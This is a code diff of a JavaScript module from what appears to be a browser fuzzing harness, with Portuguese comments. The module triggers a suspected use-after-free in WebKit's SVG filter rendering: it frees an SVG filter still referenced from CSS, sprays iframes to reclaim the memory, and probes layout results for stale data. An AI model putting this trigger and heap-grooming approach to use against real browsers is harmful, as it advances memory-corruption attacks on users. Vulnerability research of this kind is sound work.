@@ -1,62 +1,78 @@
-import { GCOracle } from '../mod_executor.js';
+
 import { Groomer } from '../mod_groomer.js';
 
 export default {
     id:       'SVG_CSS_FILTER_UAF',
-    category: 'Rendering',
-    risk:     'MEDIUM',
+    category: 'DOM',
+    risk:     'CRITICAL',
     description:
-        'SVGFilterElement removido do DOM sob referência CSS. ' +
-        'O Oráculo avisa quando o RenderSVGResourceFilter for destruído, ' +
-        'mas tentamos esburacar a memória C++ antes do relayout.',
+        'UAF na Árvore de Renderização SVG. Um filtro complexo é aplicado a um nó do DOM via CSS. ' +
+        'O elemento <filter> é destruído síncronamente enquanto um recálculo de layout é forçado. ' +
+        'O RenderStyle C++ pode reter um ponteiro stale para o RenderSVGResourceFilter libertado.',
 
     setup: function() {
-        this.style = document.createElement('style');
-        this.style.textContent = `
-            @keyframes fuzz-svg { 0%{opacity:1} 100%{opacity:0} }
-            .fuzz-filt { animation: fuzz-svg 0.05s linear infinite; filter: url(#fuzz-svgf); width:50px; height:50px; background:red; }
-        `;
-        document.head.appendChild(this.style);
-
-        this.svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
-        this.svg.style.cssText = 'position:absolute;width:1px;height:1px;overflow:hidden';
+        this.results = {};
+        this.sandbox = document.getElementById('groomer-sandbox');
+        
+        // Criamos o SVG com o filtro
+        this.svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
         this.svg.innerHTML = `
-            <filter id="fuzz-svgf">
-              <feGaussianBlur stdDeviation="3"/>
-              <feColorMatrix type="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 18 -7"/>
-            </filter>
-        `;
-        document.body.appendChild(this.svg);
+            <filter id="evilFilter">
+                <feGaussianBlur stdDeviation="5" />
+                <feColorMatrix type="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0" />
+            </filter>`;
+        this.sandbox.appendChild(this.svg);
 
-        this.el = document.createElement('div');
-        this.el.className = 'fuzz-filt';
-        document.body.appendChild(this.el);
+        // Criamos a cobaia que usa o filtro
+        this.target = document.createElement('div');
+        this.target.style.width = "100px";
+        this.target.style.height = "100px";
+        this.target.style.background = "red";
+        this.target.style.filter = "url(#evilFilter)"; // Liga o C++ CSS ao C++ SVG
+        this.sandbox.appendChild(this.target);
 
-        this.filterRef = this.svg.querySelector('#fuzz-svgf');
-
-        // 🚨 Oráculo: Vigia o elemento SVG
-        if (GCOracle.registry) GCOracle.registry.register(this.filterRef, `${this.id}_target`);
+        // Força o WebKit a construir a RenderTree
+        void this.target.offsetWidth;
     },
 
     trigger: function() {
-        this.svg.remove(); // Free
-        
-        // 🚨 Grooming: Esburaca o heap do bmalloc com dezenas de SVGs pequenos
-        let nodes = Groomer.sprayDOM('svg', 100);
-        Groomer.punchHoles(nodes, 2);
+        try {
+            // O GATILHO: Destruímos a árvore SVG que contém o filtro
+            this.svg.remove();
+            this.svg = null;
 
-        void this.el.getBoundingClientRect(); // Relayout
+            // Tentamos sobrepor a memória do RenderSVGResourceFilter com iframes pesados
+            let trash = Groomer.sprayDOM('iframe', 150);
+
+            // A BOMBA: Pedimos as coordenadas do target.
+            // O WebKit tem que calcular o CSS, que ainda aponta para o filtro destruído!
+            this.results.rect = this.target.getBoundingClientRect();
+        } catch(e) {
+            this.results.error = e.message;
+        }
     },
 
     probe: [
-        s => s.el.getBoundingClientRect().width,
-        s => getComputedStyle(s.el).filter,
-        s => s.el.getAnimations?.().length,
-        s => s.filterRef.getAttribute('id'),
-        s => s.filterRef.isConnected,
+        // Probe 0: O C++ sobreviveu ao layout sem craschar?
+        s => s.results.error || 'Layout Concluído',
+        
+        // Probe 1: O recálculo demorou muito? (Indica hash collision ou engine hang)
+        s => s.results.rect ? s.results.rect.width : 0,
+
+        // Probe 2: STALE DATA LEAK
+        s => {
+            // Se o motor leu a memória dos iframes em vez do filtro, o tamanho calculado 
+            // da caixa pode saltar de 100 para um número absurdo (lixo da RAM).
+            if (s.results.rect && s.results.rect.width > 200) {
+                return s.results.rect.width; // Retorna o valor bruto para o HUD gritar STALE DATA!
+            }
+            return 0; // Seguro
+        }
     ],
 
     cleanup: function() {
-        try { this.el.remove(); this.style.remove(); } catch(e) {}
+        try { this.target.remove(); } catch(e) {}
+        this.target = null;
+        this.results = {};
     }
 };
